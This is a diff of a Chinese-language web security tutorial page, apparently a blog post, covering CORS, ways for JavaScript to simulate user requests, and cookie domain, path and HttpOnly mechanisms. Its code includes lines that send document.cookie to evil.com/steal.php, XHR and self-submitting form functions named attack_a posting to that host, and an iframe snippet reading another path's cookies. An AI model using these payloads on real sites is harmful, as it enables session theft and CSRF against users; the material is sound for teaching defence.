@@ -501,7 +501,7 @@ header(&quot;Access-Control-Allow-Credentials: true&quot;); // 允许跨域证�
 //...
 ?&gt;</code></pre>
 <p><strong>❗️如果设置<code>Access-Control-Allow-Credentials: true</code>，那么<code>Access-Control-Allow-Origin</code>就不能设置为<code>*</code>通配符，这也是浏览器为了安全进行的考虑</strong></p>
-<p>有了<code>CORS</code>机制，跨域就变得特别方便了，该功能要慎重使用，否则后果会很严重</p>
+<p>有了<code>CORS</code>机制，跨域就变得特别方便；但该功能要慎重使用，否则后果会很严重</p>
 <h2 id="模拟用户发起浏览器请求"><a href="#模拟用户发起浏览器请求" class="headerlink" title="模拟用户发起浏览器请求"></a>模拟用户发起浏览器请求</h2><p>在浏览器中用户发出的请求基本上都是HTTP协议里的GET与POST方式。对于GET方式，实际上就是一个URL</p>
 <pre><code class="javascript">//新建一个img标签对象，对象的src属性指向目标地址
 new Image().src=&quot;http://www.evil.com/steal.php&quot;+escape(document.cookie);
@@ -515,6 +515,136 @@ location.href=&quot;http://www.evil.com/steal.php&quot;+escape(document.cookie);
 </ul>
 <p>如果使用异步方式，就是AJAX。异步则表示请求发出去后，JavaScript可以去做其他事情，待响应回来后会自动触发xhr对象的<code>onreadystatechange</code>事件，可以监听这个事件以处理响应内容。同步则表示请求发出去后，JavaScript需要等待响应回来，这期间就进入阻塞阶段</p>
 <p><strong>👇一段同步的示例</strong></p>
+<pre><code class="javascript">xhr = function () {
+    var request = false;
+    if (window.XMLHttpRequest) {
+        request = new XMLHttpRequest()
+    } else if (window.ActiveXObject) {
+        try {
+            request = new window.ActiveXObject(&#39;Microsoft.XMLHttp&#39;)
+        } catch (e) {
+            throw e
+        }
+    }
+
+    return request
+}();
+
+request = function (method, src, argv, content_type) {
+    xhr.open(method, src, false); // 同步方法初始化一个请求
+    if (method === &#39;POST&#39;)
+        xhr.setRequestHeader(&#39;Content-Type&#39;, content_type)
+
+    xhr.send(argv) // 发送POST数据
+    return xhr.responseText // 返回响应内容
+}
+
+attack_a = function () {
+    var src = &#39;http://www.evil.com/steal.php&#39;
+    var argv_0 = &#39;&amp;name1=value1&amp;name2=value2&#39;
+    request(&#39;POST&#39;, src, argv_0, &#39;application/x-form-urlencoded&#39;)
+}
+
+attack_a()</code></pre>
+<p>POST表单提交的<code>Content-Type</code>为<code>application/x-www-form-urlencoded</code>一种默认的标准格式。还有一种比较常见<code>multipart/form-data</code>一般出现在有文件上传的表单中</p>
+<pre><code class="javascript">xhr = function () {
+    var request = false;
+    if (window.XMLHttpRequest) {
+        request = new XMLHttpRequest()
+    } else if (window.ActiveXObject) {
+        try {
+            request = new window.ActiveXObject(&#39;Microsoft.XMLHttp&#39;)
+        } catch (e) {
+            throw e
+        }
+    }
+
+    return request
+}();
+
+request = function (method, src, argv, content_type) {
+    xhr.open(method, src, false); // 同步方法
+    if (method === &#39;POST&#39;)
+        xhr.setRequestHeader(&#39;Content-Type&#39;, content_type)
+
+    xhr.send(argv) // 发送POST数据
+    return xhr.responseText // 返回响应内容
+}
+
+attack_a = function () {
+    var src = &#39;http://www.evil.com/steal.php&#39;
+    var name1 = &quot;value1&quot;;
+    var name2 = &quot;value2&quot;;
+    var argv_0 = &quot;\r\n&quot;;
+    argv_0 += &quot;---------------------7964f8dddeb95fc5\r\nContent-Disposition:form-data; name=\&quot;name1\&quot;\r\n\r\n&quot;;
+    argv_0 += (name1+&quot;\r\n&quot;);
+    argv_0 += &quot;---------------------7964f8dddeb95fc5\r\nContent-Disposition:form-data; name=\&quot;name2\&quot;\r\n\r\n&quot;;
+    argv_0 += (name2+&quot;\r\n&quot;);
+    argv_0 += &quot;---------------------7964f8dddeb95fc5--\r\n&quot;;
+    request(&quot;POST&quot;,src,argv_0,&quot;multipart/form-data; boundary=-------------------7964f8dddeb95fc5&quot;);
+}
+
+attack_a()</code></pre>
+<p>除了通过xhr对象模拟表单提交外，还有一种比较原始的方式，<strong>form表单自提交</strong>。原理是通过JavaScript动态创建一个form，并设置好form中的每个input键值，然后对form对象做<code>submit()</code>操作</p>
+<pre><code class="javascript">function new_form() {
+    var f = document.createElement(&#39;form&#39;)
+    document.body.appendChild(f)
+    f.method = &#39;post&#39;
+    return f
+}
+
+function create_elements(eForm, eName, eValue) {
+    var e = document.createElement(&#39;input&#39;)
+    eForm.appendChild(e)
+    e.type = &#39;text&#39;
+    e.name = eName
+    e.value = eValue
+    return e
+}
+
+var _f = new_form() // 创建form对象
+create_elements(_f, &#39;name1&#39;, &#39;value1&#39;) // 创建form中input对象
+create_elements(_f, &#39;name2&#39;, &#39;value2&#39;)
+_f.action = &#39;http://www.evil.com/steal.php&#39;
+_f.submit() // 提交</code></pre>
+<p>介绍了好几种模拟用户发起浏览器请求的方法，其用处很大且使用很频繁。前端黑客攻击中，比如XSS经常需要发起各种请求，如盗取Cookies、蠕虫攻击等，👆几种方式都是XSS攻击常用的，而最后一个表单自提交方式经常用于CSRF攻击中</p>
+<h2 id="Cookie安全"><a href="#Cookie安全" class="headerlink" title="Cookie安全"></a>Cookie安全</h2><p>Cookie是一个神奇的机制，同域内浏览器中发出的任何一个请求都会带上Cookie，无论请求什么资源，请求时Cookie出现在请求头的Cookie字段中。服务端响应头的<code>Set-Cookie</code>字段可以添加、修改和删除Cookie。<strong>大多数情况下，客户端通过JavaScript也可以添加、修改和删除Cookie</strong></p>
+<p>由于这样的机制，Cookie经常被用来存储用户的会话信息，比如用户登录认证后的<code>Session ID</code>，之后在同域内发出的请求都会带上<strong>认证后的会话信息</strong>，这非常方便</p>
+<p><strong>🔔攻击者就特别喜欢盗取Cookie，这相当于盗取了目标网站上的用户权限</strong></p>
+<p><strong>Cookie的重要字段</strong></p>
+<pre><code>[name][value][domain][path][expires][httponly][secure]
+[名称][值][所属域名][所属相对根路径][过期时间][HttpOnly标志][Secure标志]</code></pre>
+<p>👆这些字段用好了，Cookie就是安全的</p>
+<h3 id="子域Cookie机制"><a href="#子域Cookie机制" class="headerlink" title="子域Cookie机制"></a>子域Cookie机制</h3><p>设置Cookie时，如果不指定domain的值，默认就是本域</p>
+<p>例如<code>a.foo.com</code>域通过JavaScript设置Cookie</p>
+<pre><code class="javascript">document.cookie=&quot;test=1&quot;;</code></pre>
+<p>那么domain值默认为<code>a.foo.com</code>。有趣的是<code>a.foo.com</code>域设置Cookie时，可以指定domain为父级域</p>
+<pre><code class="javascript">document.cookie=&quot;test=1;domain=foo.com&quot;;</code></pre>
+<p>此时domain就变为<code>foo.com</code></p>
+<ul>
+<li>这样带来的好处就是可以在不同的子域共享Cookie，</li>
+<li>坏处也很明显，就是攻击者控制的其他子域也能读到这个Cookie</li>
+</ul>
+<p>另外这个机制不允许设置Cookie的domain为下一级子域或其他外域</p>
+<h3 id="路径Cookie机制"><a href="#路径Cookie机制" class="headerlink" title="路径Cookie机制"></a>路径Cookie机制</h3><p>设置Cookie时，如果不指定path值，默认就是目标页面的路径</p>
+<p>例如<code>a.foo.com/admin/index.php</code>页面通过JavaScript来设置Cookie</p>
+<pre><code class="javascript">document.cookie=&quot;test=1&quot;;</code></pre>
+<p>👆path值就是<code>/admin/</code>。通过指定path字段，JavaScript有权限设置任意Cookie到任意路径下，但是只有目标路径下的页面JavaScript才能读取到该Cookie</p>
+<p><strong>❓那么有什么办法跨路径读取Cookie</strong></p>
+<p>比如<code>/evil/</code>路径想读取<code>/admin/</code>路径的Cookie。很简单通过跨iframe进行DOM操作即可</p>
+<p><strong>👇<code>/evil/</code>路径下页面的代码</strong></p>
+<pre><code class="javascript">xc = function (src) {
+    var o = document.createElement(&#39;iframe&#39;)
+    o.src = src
+    document.getElementsByTagName(&#39;body&#39;)[0].appendChild(o)
+    o.onload = function () {
+        var d = o.contentDocument || o.contentWindow.document
+        alert(d.cookie)
+    }
+}(&#39;http://a.foo.com/admin/index.php&#39;)</code></pre>
+<p>所以通过设置path不能防止重要的Cookie被盗取</p>
+<h3 id="HttpOnly-Cookie机制"><a href="#HttpOnly-Cookie机制" class="headerlink" title="HttpOnly Cookie机制"></a>HttpOnly Cookie机制</h3><p><code>HttpOnly</code>是指仅在HTTP层面上传输的Cookie，当设置了<code>HttpOnly</code>标志后，客户端脚本就无法读写该Cookie，这样能有效地防御XSS攻击获取Cookie</p>
+<p>以PHP setcookie为例，httponly.php文件代码👇</p>
 
         </div>
         <!-- .entry-content -->
